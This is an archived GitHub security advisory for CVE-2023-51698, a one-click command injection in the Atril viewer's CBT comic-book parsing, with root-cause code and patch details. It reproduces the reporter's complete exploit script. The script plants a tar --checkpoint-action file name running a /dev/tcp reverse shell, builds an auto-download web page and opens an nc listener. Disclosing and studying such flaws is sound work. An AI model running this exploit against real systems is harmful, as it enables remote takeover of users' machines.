---
url: "https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2"
title: "Critical Remote Code Execution Vulnerability in Atril's CBT comic book parsing"
site: "GitHub"
captured: "2026-11-02T19:05:51Z"
via: "live"
sha256: "47cc5178cce0791657441ddb05e79ba42a2faa0220eae7ec4b7cbdbb008a1fb8"
wayback: "https://web.archive.org/web/20260111142410/https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2"
cited_in:
  - "docs/threats/08-desktop-and-sandboxing.md"
---

# Critical Remote Code Execution Vulnerability in Atril's CBT comic book parsing

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>
> Snapshot: <https://web.archive.org/web/20260111142410/https://github.com/mate-desktop/atril/security/advisories/GHSA-34rr-j8v9-v4p2>

## Repository navigation

#  Critical Remote Code Execution Vulnerability in Atril's CBT comic book parsing

Critical

[lukefromdc](https://github.com/lukefromdc) published GHSA-34rr-j8v9-v4p2 Jan 7, 2024

## Package

Atril

## Affected versions

<= 1.6.1

## Patched versions

>= 1.6.2

## Description

### Summary

A Critical One-Click RCE/Command Injection Vulnerability Affecting Popular Linux Operating Systems with MATE, Cinnamon, and some Xfce desktop Environments.

Affected Operating Systems:

Kali Linux (Popular OS among Security professionals, researchers)
Parrot OS (Popular OS among Security professionals, researchers)
Ubuntu-Mate
Xubuntu
Fedora Cinnamon
Fedora Mate
Manjaro Mate
Manjaro Cinnamon
Ubuntu Kylin (Official Chinese Ubuntu)
Kylin OS V10 ( OS said to be used in the Chinese Government Sectors )

And other MATE, Cinnamon, and some Xfce desktop Environments.

Affected Software Component: All versions including the latest versions of Atril Document Viewer (Default Doc reader for MATE environment, one of the popular doc readers).

Vulnerability Summary:

This is a one-click Remote Command Execution vulnerability that gives the attacker immediate access to the target system when the target user opens a crafted document or clicks on a crafted link/URL.

This vulnerability is due to a bad code segment in Atril responsible for handling comic book documents (.cbr, .cbz, .cbt, .cb7). Comic book documents are just archives that contain images in it. The vulnerability here can be exploited using a maliciously crafted CBT document which is a TAR archive.

Root Cause - Vulnerable Code segment in both doc viewers (comics-document.c):

```
static const ComicBookDecompressCommand command_usage_def[] = {
        /* RARLABS unrar */
	{"%s p -c- -ierr --", "%s vb -c- -- %s", NULL             , FALSE, NO_OFFSET},

        /* GNA! unrar */
	{NULL               , "%s t %s"        , "%s -xf %s %s"   , FALSE, NO_OFFSET},

        /* unzip */
	{"%s -p -C --"      , "%s %s"          , NULL             , TRUE , OFFSET_ZIP},

        /* 7zip */
	{NULL               , "%s l -- %s"     , "%s x -y %s -o%s", FALSE, OFFSET_7Z},

        /* tar */
	{"%s -xOf"          , "%s -tf %s"      , NULL             , FALSE, NO_OFFSET},

	/* UNARCHIVER */
	{"unar -o -"	    , "%s %s"	       , NULL		  , FALSE, NO_OFFSET}
};

```

By looking at the above code, we can see that there are shell commands used for decompression. Look at the /* tar */ section, it actually calls the following shell command, "tar -xOf -tf ". This is to view/load each image inside the CBT document. This behavior can be exploited by using an option of tar program '--checkpoint-action' to execute arbitrary commands on the target by naming one of the images inside the CBT document to something like '--checkpoint-action=EXEC=bash -c "whoami>/tmp/who.txt";.jpg'.

This vulnerability was already found in Evince Document viewer (the default Doc reader of GNOME) back in 2017. Since Atril is a fork of Evince, this vulnerability was present in Atril. Atril's team fixed the vulnerability at that time by adding a piece of code that quits Atril's process if the CBT file with "--checkpoint-action=" in its name. The following was the patch (comics-document.c) (line - 983):

```
extract_argv (EvDocument *document, gint page)
{
	ComicsDocument *comics_document = COMICS_DOCUMENT (document);
	char **argv;
	char *command_line, *quoted_archive, *quoted_filename;
	GError *err = NULL;

	if (g_strrstr (comics_document->page_names->pdata[page], "--checkpoint-action="))
	{
		g_warning ("File unsupported\n");
		gtk_main_quit ();
	}

```

As you can see, it throws a "File Unsupported" message to the console and quits when it sees "--checkpoint-action=" in a page/filename. I noticed that this only works with an empty file or a really small image file, and if we provide a larger file with more bytes, the "gtk_main_quit ();" function fails, so it continues to run, thus executing the injected arbitrary command.

In the MATE desktop environment, many XFCE and lightweight desktop environments (including OS like Kali, Parrot, Xubuntu, Ubuntu Mate, Kylin, Fedora Mate, Manjaro Mate), this vulnerability can be exploited just by sending a link/URL because these Operating Systems/Environments has Atril and Atril has an additional component called atril-previewer that will trigger the exploit without even opening or clicking on the document. An attacker can craft a webpage that instantly downloads the crafted CBT file onto the target system when the target user visits the webpage and the latest Firefox browser nowadays downloads automatically by default without user confirmation, when the user navigates to his Downloads directory the payload will be executed, gives the attacker the shell.

I have attached a fully working exploit with this submission.

In the demo video, the following is the scenario:
Attacker Machine - Kali Linux
Victim Machine - Kali Linux latest edition (2023.3)
Victim visits the malicious URL/Link generated by my exploit script

Exploit Dependencies: poppler-utils
Please install poppler-utils before running the exploit script on your Linux machine (Kali preferred). Installation: apt install poppler-utils.

#### exploit.sh

```
#! /bin/bash

# Requires pdftoppm from poppler-utils
banner(){
echo "
╔╦╗┌─┐┌─┐╔╦╗┌─┐┬─┐
 ║║│ ││   ║ ├─┤├┬┘
═╩╝└─┘└─┘ ╩ ┴ ┴┴└─
╔═╗┌┬┐┬─┐┬┬   ╦┌┐┌ ┬┌─┐┌─┐┌┬┐
╠═╣ │ ├┬┘││───║│││ │├┤ │   │
╩ ╩ ┴ ┴└─┴┴─┘ ╩┘└┘└┘└─┘└─┘ ┴
0-day Exploit
                                  -by Febin (@febin_nj)

[ Affected OS: Kali, Parrot OS, Linux Mint, Ubuntu-Mate, Xubuntu, Ubuntu-Kylin, Kylin OS, Fedora-Mate, Fedora-Cinnamon, Manjaro Mate, Manjaro Cinnamon ]
[ Affected Software: Atril Document viewer, Xreader ]

"

}

mainProgram(){
printf " [>] LHOST: "
read IP

printf " [>] LPORT: "
read LPORT

printf "[>] Location to the PDF to spoof [Default: sample.pdf]: "
read pdf_path
pdf_path=${pdf_path:-./sample.pdf}

export PAYLOAD="0<\&34-;exec 34<>/dev/tcp/${IP}/${LPORT};bash -i <\&34 >\&34 2>\&34"

echo "/Creator (Adobe Acrobat)" > emptyfile

tar -cf poc.cbt --transform="s|emptyfile|%PDF-1.4
%âã
1 0 obj
<<
/Title (TEST PDF file)
/Creator (Adobe Acrobat)
/Producer (Qt 5.15.8)
/CreationDate (D:20230812194726)
>>
endobj
|" emptyfile

mkdir Pages 2>/dev/null

pdftoppm ${pdf_path} Pages/Page -jpeg
tar -uf poc.cbt Pages/*.jpg

cp Pages/Page-1.jpg feb.jpg

tar -P -uf poc.cbt --transform="s|feb.jpg|  --checkpoint-action=exec=bash -c '$PAYLOAD';.jpg|" feb.jpg

rm -rf emptyfile

mkdir output/ 2>/dev/null

mv poc.cbt output/poc.cbt

rm -rf feb.jpg

rm -rf Pages/

echo "[+] Malicious Comic document is generated: $(realpath output/poc.cbt)"

printf " Do you want to start the listener here? [Y/n]: "
read choice

b64data="$(cat output/poc.cbt | base64 -w0)"
echo "
<body>
<h1>HELLO</h1>
</body>
<script>
filename = \"poc.cbt\"
filedata = \"$b64data\"

function base64tobytes(base64data){
    var binaryValues = atob(base64data);
    var binaryLength = binaryValues.length
    var bytesData = new Uint8Array(binaryLength);

    for ( var i = 0; i < binaryLength; i++){
        bytesData[i] = binaryValues.charCodeAt(i);
    }

    return bytesData.buffer;
}

var fileBytes = base64tobytes(filedata);
var blob = new Blob([fileBytes], {\"type\":\"octet/stream\"});

var anchor = document.createElement(\"a\");
document.body.append(anchor);
anchor.style = \"display: None;\"

var url = window.URL.createObjectURL(blob);
anchor.href = url;
anchor.download = filename;

anchor.click();
window.URL.revokeObjectURL(url);
</script>
" > output/index.html
python3 -m http.server 8888 -d output/ >/dev/null 2>&1 &

echo "[+] Web server started on port 8888.."
echo "[+] Send the link http://[your-ip-address]:8888/index.html to the victim."
echo " "
trap "killall python3; exit" INT
if [[ ${choice} == "Y" || ${choice} == "y" ]]
then
trap "killall python3; exit" INT
nc -nlvp "$LPORT"
else
echo "[+] Exiting.."
killall python3
exit
fi

}

if [ $(which pdftoppm) ]
then
banner
mainProgram
else
echo "[-] pdftoppm not found! Please install poppler-utils to run this exploit."
exit
fi

```

Atril_0day_demo.2.mp4

### Impact

Remote Code Execution on the target system.

The atril-previewer makes this vulnerability more dangerous as it can be exploited by a sing Link/URL to achieve RCE.

### Severity

Critical

/ 10

#### CVSS v3 base metrics

Attack vector

Network

Attack complexity

Low

Privileges required

None

User interaction

Required

Scope

Changed

Confidentiality

High

Integrity

High

Availability

Low

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L

### CVE ID

CVE-2023-51698

### Weaknesses

Weakness CWE-78

####   [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://github.com/advisories?query=cwe%3A78)

The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.  [Learn more on MITRE.](https://cwe.mitre.org/data/definitions/78.html)

### Credits

-   https://github.com/febinrev [febinrev](https://github.com/febinrev)   Reporter
